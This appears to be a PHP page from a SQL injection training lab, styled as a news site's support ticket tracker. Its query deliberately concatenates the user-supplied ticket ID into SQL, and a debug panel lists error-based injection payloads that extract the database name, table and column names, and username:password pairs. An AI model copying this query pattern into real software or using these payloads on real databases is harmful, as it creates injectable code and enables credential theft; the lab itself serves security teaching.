<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Support Ticket Tracker - The Daily Secure</title>
    <link rel="icon" href="favicon.svg" type="image/svg+xml">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="news_theme.css">
    <style>
        body { background-color: #f3f4f6; }
        .tracker-container { max-width: 600px; margin: 3rem auto; padding: 0 1.5rem; }
        .status-card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
        .ticket-header { margin-bottom: 2rem; border-bottom: 1px solid #e5e7eb; padding-bottom: 1rem; }
        .ticket-header h1 { font-family: var(--news-font); font-size: 1.8rem; color: #111827; }
    </style>
</head>
<body class="news-body">

    <!-- Navbar -->
    <nav class="news-navbar">
        <div class="news-container">
            <a href="index.php" class="news-brand">
                <span>The Daily</span> Secure
            </a>
            <div class="news-nav-links">
                <a href="lab_union.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_union.php' ? 'class="active"' : ''; ?>>Technology</a>
                <a href="lab_auto.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_auto.php' ? 'class="active"' : ''; ?>>Archive</a>
                <a href="lab_login.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_login.php' ? 'class="active"' : ''; ?>>Login</a>
                <a href="lab_error.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_error.php' ? 'class="active"' : ''; ?>>Support</a>
                <a href="lab_blind.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_blind.php' ? 'class="active"' : ''; ?>>Offers</a>
                <a href="lab_second_order.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_second_order.php' ? 'class="active"' : ''; ?>>HR Portal</a>
                <a href="lab_file.php" <?php echo basename($_SERVER['PHP_SELF']) == 'lab_file.php' ? 'class="active"' : ''; ?>>Transparency</a>
                <a href="index.php" style="border-left: 1px solid #cbd5e1; padding-left: 1rem; margin-left: 0.5rem;">Lab Dashboard</a>
            </div>
        </div>
    </nav>

    <div class="tracker-container">
        <div class="status-card">
            <div class="ticket-header">
                <h1>Track Support Ticket</h1>
                <p style="color: #6b7280; margin-top: 0.5rem;">Enter your Ticket ID to check resolution status.</p>
            </div>

            <form method="GET" action="" style="margin-bottom: 2rem;">
                <div class="form-group">
                    <label for="id">Ticket ID</label>
                    <div style="display: flex; gap: 0.5rem;">
                        <input type="text" name="id" placeholder="e.g. 1042" value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>" style="flex: 1;">
                        <button type="submit" class="btn btn-primary">Check Status</button>
                    </div>
                </div>
            </form>

            <?php
            // Enable error display for this lab
            ini_set('display_errors', 1);
            ini_set('display_startup_errors', 1);
            error_reporting(E_ALL);
            
            require_once 'db.php';
            
            // Default query for display
            $sql = "waiting for input...";
            
            if (isset($_GET['id'])) {
                $id = $_GET['id'];
                
                // VULNERABLE QUERY
                // Using 'articles' table just to simulate ticket data
                $sql = "SELECT id, title, content FROM articles WHERE id = '" . $id . "'";
                
                try {
                    $result = $conn->query($sql);
                    
                    // Check specifically for MySQL errors to display them
                    if ($conn->error) {
                        echo '<div class="alert alert-error">';
                        echo '<strong style="display:block; margin-bottom:0.5rem; color: #b91c1c;">⚠️ Application Error (Debug Mode)</strong>';
                        echo '<code style="display:block; background:rgba(255,255,255,0.5); padding:0.5rem;">' . htmlspecialchars($conn->error) . '</code>';
                        echo '<p style="margin-top:0.5rem; font-size:0.85rem;">Please report this error code to the administrator.</p>';
                        echo '</div>';
                    } elseif ($result && $result->num_rows > 0) {
                        $row = $result->fetch_assoc();
                        echo '<div style="background: #f0fdf4; border: 1px solid #bbf7d0; padding: 1rem; border-radius: 6px;">';
                        echo '<h3 style="color: #166534; font-size: 1.1rem; margin-bottom: 0.5rem;">✅ Ticket #' . htmlspecialchars($row['id']) . ' Found</h3>';
                        echo '<div style="color: #166534; font-weight: 600;">Subject: ' . htmlspecialchars($row['title']) . '</div>';
                        echo '<div style="color: #15803d; font-size: 0.9rem; margin-top: 0.5rem;">Status: In Progress</div>';
                        echo '</div>';
                    } else {
                        echo '<div class="alert alert-warning">Ticket ID not found in system.</div>';
                    }
                } catch (mysqli_sql_exception $e) {
                    echo '<div class="alert alert-error">';
                    echo '<strong style="display:block; margin-bottom:0.5rem; color: #b91c1c;">⚠️ Application Error (Debug Mode)</strong>';
                    echo '<code style="display:block; background:rgba(255,255,255,0.5); padding:0.5rem;">' . htmlspecialchars($e->getMessage()) . '</code>';
                    echo '<p style="margin-top:0.5rem; font-size:0.85rem;">Please report this error code to the administrator.</p>';
                    echo '</div>';
                }
            }
            ?>
        </div>
    </div>

    <!-- Debug Console -->
    <div class="debug-console" id="debugConsole">
        <div class="debug-header" onclick="toggleConsole()">
            <div class="debug-title">
                <span>⚠️ Developer Console</span>
                <span style="font-size: 0.8em; font-weight: normal; opacity: 0.7;">(Error Handling Mode)</span>
            </div>
            <div style="font-size: 0.8em; opacity: 0.7;">Click to Toggle</div>
        </div>
        <div class="debug-content">
            <span class="debug-label">EXECUTED QUERY:</span>
            <code class="debug-code"><?php echo htmlspecialchars($sql); ?></code>
            <div style="margin-top: 0.5rem; font-size: 0.8em; color: #64748b;">
                <strong>Hint:</strong> Trigger an error to leak data. Try:
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.9;">'</code>
                <div style="margin-top: 0.5rem;"><strong>Basic ExtractValue:</strong></div>
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.9;">' AND extractvalue(1,concat(0x3a,database())) #</code>
                <div style="margin-top: 0.5rem;"><strong>Advanced (Table Name):</strong></div>
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.9;">' AND extractvalue(1,concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))#</code>
                <div style="margin-top: 0.5rem;"><strong>Advanced (Column Name):</strong></div>
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.9;">' AND extractvalue(1,concat(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))#</code>
                <div style="margin-top: 0.5rem;"><strong>Advanced (Dump Data):</strong></div>
                <code class="debug-code" style="font-size: 0.8em; opacity: 0.9;">' AND extractvalue(1,concat(0x3a,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))#</code>
            </div>
        </div>
    </div>

    <script>
        function toggleConsole() {
            document.getElementById('debugConsole').classList.toggle('console-minimized');
        }
    </script>
</body>
</html>
